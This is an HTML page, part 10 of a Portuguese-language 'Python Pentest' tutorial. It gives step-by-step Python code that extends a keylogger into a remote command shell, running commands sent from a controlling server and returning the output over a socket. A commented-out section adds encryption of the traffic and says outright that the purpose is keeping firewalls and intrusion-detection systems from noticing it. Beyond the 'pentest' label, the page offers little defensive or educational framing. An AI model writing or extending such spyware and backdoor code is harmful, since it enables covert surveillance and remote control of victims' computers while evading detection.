<!DOCTYPE html>
<html lang="pt-br">
    <head>
        <meta charset="UTF-8"/>
        <link rel="icon" href="imagens/favicon.ico"/>
        <title>Aprenda Python Pentest</title>
        <link rel="stylesheet" href="css/estilo.css"/>
    </head>
    <body>
        <div>
            <header>
                <h1>Aprenda Python Pentest</h1>
                <menu>
                    <li><a href="index.html">Página Inicial</a></li>
                    <li><a href="contato.html">Contato!</a></li>
                    <li><a href="tudo-sobre-python-pentest-1.html">Tudo sobre Python Pentest Parte 1!</a></li>
                    <li><a href="tudo-sobre-python-pentest-2.html">Tudo sobre Python Pentest Parte 2!</a></li>
                    <li><a href="tudo-sobre-python-pentest-3.html">Tudo sobre Python Pentest Parte 3!</a></li>
                    <li><a href="tudo-sobre-python-pentest-4.html">Tudo sobre Python Pentest Parte 4!</a></li>
                    <li><a href="tudo-sobre-python-pentest-5.html">Tudo sobre Python Pentest Parte 5!</a></li>
                    <li><a href="tudo-sobre-python-pentest-6.html">Tudo sobre Python Pentest Parte 6!</a></li>
                    <li><a href="tudo-sobre-python-pentest-7.html">Tudo sobre Python Pentest Parte 7!</a></li>
                    <li><a href="tudo-sobre-python-pentest-8.html">Tudo sobre Python Pentest Parte 8!</a></li>
                    <li><a href="tudo-sobre-python-pentest-9.html">Tudo sobre Python Pentest Parte 9!</a></li>
                    <li><a href="tudo-sobre-python-pentest-10.html" onclick="alert('Você já Está na Matéria desse Link!'); return false">Tudo sobre Python Pentest Parte 10!</a></li>
                    <li><a href="tudo-sobre-python-pentest-11.html">Tudo sobre Python Pentest Parte 11!</a></li>
                    <li><a href="tudo-sobre-python-pentest-12.html">Tudo sobre Python Pentest Parte 12!</a></li>
                    <li><a href="tudo-sobre-python-pentest-13.html">Tudo sobre Python Pentest Parte 13!</a></li>
                </menu>
            </header>
           
<h2>Tudo sobre Python Pentest Parte 10</h2>

<h3>Executando Comandos no Sistema</h3>

<p>Podemos executar comandos do sistema no Python, que não será exatamente um shell verdadeiro, mas podemos executar alguns comandos com a biblioteca <code>subprocess</code>.</p>

<p>No nosso keylogger, crie essa função:</p>

<pre>
<code>
def runComand(comand, sock):
    # Coloque import subprocess no início do código
    result = subprocess.run(comand, shell = True, text = True, capture_output = True) # O text retorna um texto
    saida = result.stdout
    erro = result.stderr

    if saida:
        sendData("alerta", saida, sock)
    elif erro:
        sendData("alerta", erro, sock)
</code>
</pre>

<p>E na função recvData do keylogger, vamos colocar um else no if dos comandos:</p>

<pre>
<code>
if comando.lower() == "sk1":
    # Aqui não mexe em nada
elif comando.lower() == "sk0":
    # Aqui também não mexe em nada
elif comando.lower() == "exit":
    # Nem aqui
else:
    runComand(comando, sock) # Sem lower
</code>
</pre>

<p>PS: Caso dê erro ao utilizar comandos com várias linhas como o dir, vá no sendData do keylogger e coloque uma quebra de linha no packet, assim:</p>

<pre>
<code>
packet = json.dumps(rawPacket) + "\n"
</code>
</pre>

<p>E modifique a função recvData do servidor assim:</p>

<pre>
<code>
def recvData(sock):
    buffer = ""

    while True:
        try:
            rawData = sock.recv(1024)

            if not rawData:
                break

            buffer += rawData.decode(errors = "ignore")

            while "\n" in buffer:
                linha, buffer = buffer.split("\n", 1)

                if not linha.strip():
                    continue

                data = json.loads(linha) # Importe json

                if "tecla" in data:
                    with open("teclas.txt", "a") as arqKey:
                        arqKey.write(f"{data["tecla"]}\n")
                elif "alerta" in data:
                    msg = data["alerta"]
                    print(f"[!] {msg}   \nComando &gt; ", end = "")
        except OSError:
            break
</code>
</pre>

<p>Lembrando que o comando cd ele não muda o diretório do programa. Isso corrigiremos depois.</p>

<p>Na mesma função acima, em servidor, coloque abaixo do elif de alerta esse elif aqui:</p>

<pre>
<code>
elif "comando" in data:
    comando = data["comando"]
    print(f"\n{comando}     \nComando &gt; ", end = "")
</code>
</pre>

<p>E no keylogger, em runComand, altere o if else pra isso:</p>

<pre>
<code>
if saida:
    sendData("comando", saida, sock)
elif erro:
    sendData("comando", erro, sock)
</code>
</pre>

<p>No recvData do keylogger, faça a alteração do início da função assim:</p>

<pre>
<code>
def recvData(sock):
    global monitorar, pwd
    pwd = os.getcwd() # Isso pega a pasta atual que ele está executando
    monitorar = False

    # O restante permanece igual
</code>
</pre>

<p>E o runComand do keylogger, deixe ele assim:</p>

<pre>
<code>
def runComand(comand, sock):
    global pwd
    if comand[:3] == "cd ": # Não esqueça do espaço
        result = subprocess.run(comand + " & cd", shell = True, text = True, capture_output = True, cwd = pwd)
        saida = result.stdout
        erro = result.stderr

        if saida:
            pwd = saida.strip()
        elif erro:
            sendData("comando", erro, sock)
    else:
        result = subprocess.run(comand, shell = True, text = True, capture_output = True, cwd = pwd) # Adicionando outro parâmetro
        saida = result.stdout
        erro = result.stderr

        if saida:
            sendData("comando", saida, sock)
        elif erro:
            sendData("comando", erro, sock)
</code>
</pre>

<!-- Alternativa:
def runComand(comand, sock):
    global pwd

    if comand[:3].lower() == "cd ":
        novoDir = comand[3:].strip().strip("\"").strip("'")

        if not novoDir:
            novoDir = os.path.expanduser("~")
        elif novoDir in ("/", "\\"):
            drive = os.path.splitdrive(pwd)[0] or os.getenv("SystemDrive", "C:")
            novoDir = drive + "\\"
        elif len(novoDir) == 2 and novoDir[1] == ":":
            novoDir += "\\"
        elif not os.path.isabs(novoDir):
            novoDir = os.path.join(pwd, novoDir)

        novoDir = os.path.abspath(novoDir)

        if os.path.isdir(novoDir):
            try:
                os.chdir(novoDir)
                pwd = os.getcwd()
            except Exception as ex:
                sendData("comando", f"Erro ao mudar de diretório: {ex}\n", sock)
        else:
            sendData("comando", f"Diretório não encontrado: {novoDir}\n", sock)

    else:
        result = subprocess.run(comand, shell=True, text=True, capture_output=True, cwd=pwd)
        saida = result.stdout
        erro = result.stderr

        if saida:
            sendData("comando", saida, sock)
        elif erro:
            sendData("comando", erro, sock)
-->

<!--
Criptografia na Rede

Nós desenvolvemos nosso keylogger, no entanto, a conexão não está criptografada, o que pode fazer com que sistemas como IDS e IPS possam interceptar o tráfego do mesmo. Vamos rodar nosso keylogger da mesma forma que antes, e vamos sniffar o tráfego com um programa como o Wireshark, fazendo o filtro com tcp.port == 9090 (se for fazer na mesma máquina, use a interface do Npcap, no Linux escolha "any"). Veremos que podemos ver de forma literal os comandos e dados filtrando os mesmos, incluindo coisas como alerta, keylogger, comando e outros. Para evitar isso, podemos criptografar o tráfego.

No keylogger, podemos pegar o mesmo código de encriptar e decriptar usados anteriormente, adaptando assim:

# Coloque acima from cryptography.fernet import Fernet
def encrypt(data):
    fern = Fernet(aesKey)

    encData = fern.encrypt(data.encode())

    return encData

def decrypt(encData):
    fern = Fernet(aesKey)

    data = fern.decrypt(encData).decode() # Decode vai fora

    return data

E daí, altere a função sendData assim:

def sendData(key, data, sock):
    rawPacket = {key: data}
    packet = json.dumps(rawPacket) + "\n" # Import json
    encPacket = encrypt(packet)
    sock.send(encPacket)

E na função recvData:

# Acima permanece igual
if rawData:
    comando = decrypt(rawData)

    if comando.lower() == "sk1":
        # Abaixo permanece igual

PS: Note que, ao criptografar, não precisamso usar o encode, o mesmo vale pro decode ao descriptografar, porque a criptografia já o transcreve para bytes.

Daí, no try de tentarConec, altere dessa forma, pra ele enviar a chave:

sk = socket.socket()
sk.connect(("127.0.0.1", 9090))

aesKey = Fernet.generate_key() # Coloque como global nessa mesma função
data = json.dumps({"chave": aesKey.decode()})
sk.send(data.encode())

return sk

Já no servidor, altere a função recvData assim:

def recvData(sock):
    buffer = ""

    while True:
        try:
            rawData = sock.recv(1024)

            if not rawData:
                break

            data = json.loads(rawData) # Importe json

            if "tecla" in data:
                with open("teclas.txt", "a") as arqKey:
                    arqKey.write(f"{data["tecla"]}\n")
            elif "alerta" in data:
                msg = data["alerta"]
                print(f"[!] {msg}   \nComando > ", end = "")
            elif "comando" in data:
                comando = data["comando"]
                print(f"\n{comando}     \nComando > ", end="")
        except OSError:
            break

No servidor, faça assim, na função startSock, adicione assim debaixo do print de conexão recebida:

data = json.loads(conn.recv(1024))
print(data["chave"])

Claro que isso é só pra ver se ele recebe a chave, o print deverá ser retirado.

data = json.loads(conn.recv(1024))
aesKey = data["chave"].encode() # Defina a variável aesKey como global no início dessa mesma função.
print(aesKey) # Retire esse print depois
conn.send("ok".encode())

E no keylogger, altere o return do tentarConec assim:

if sk.recv(4).decode() == "ok":
    print("Estabelecido com sucesso!")
    return sk
else:
    continue

Aí no caso, caso ele não receba uma chave válida, ele gerará outra chave e tentará novamente a conexão.

Daí, no servidor, defina as mesmas funções de decriptar e encriptar iguais no keylogger.

E no recvData do servidor, altere a atribuição de rawData assim:

rawData = decrypt(sock.recv(1024))

E no sendData do servidor, altere o método send do sock assim:

sock.send(encrypt(rawData))

PS: Podemos usar métodos mais simples, como usar portas conhecidas como a 8080 ou 443, que são autorizadas pelos sistemas de seguranças, mas geralmente isso exige acesso root. Lembre-se também que quem interceptar esse código pode descriptografar ele com a chave enviada, mas isso é só pra que firewalls e sistemas de segurança não detectem o tráfego do programa.

!-- Falta corrigir diretórios, provavelmente erro no buffer de criptografia --
-->

<ul>
    <li><a href="tudo-sobre-python-pentest-9.html">Parte Anterior da Matéria!</a></li>
    <li><a href="tudo-sobre-python-pentest-11.html">Continuação da Matéria!</a></li>
</ul>

        </div>
    </body>
</html>